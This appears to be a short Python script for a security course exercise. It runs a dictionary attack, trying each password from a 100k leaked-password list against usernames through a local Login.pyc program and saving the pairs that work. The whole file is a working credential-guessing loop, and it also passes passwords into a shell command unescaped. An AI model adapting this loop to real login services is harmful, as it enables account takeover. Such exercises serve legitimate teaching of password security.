import os
import sys
from time import time

start = time()
found = []
users = []

with open("../Q2/A2") as f:
    for line in f:
        line = line.strip()
        found.append((line.split(",")[0], line.split(",")[1]))

with open("../gang.txt") as f:
    for line in f:
        line = line.strip()
        if line not in [x[0] for x in found]:
            users.append(line)
   
    [print(x) for x in users]

    with open("../PwnedPWs100k.txt") as f:
        i = 0
        for password in f:
            if len(users) == 0:
                break

            password = password.strip()
            for user in users:
                if os.system(f'python3 Login.pyc {user} "{password}" > /dev/null') == 0:
                    print(f"Found {user} with password {password} (+{(time() - start):.2f}s)")
                    users.remove(user)
                    found.append((user, password))
            i += 1

with open("A3", "w") as f:
    for user, password in found:
        f.write(f"{user},{password}")

print(f"Time taken: {str(time() - start)}ms")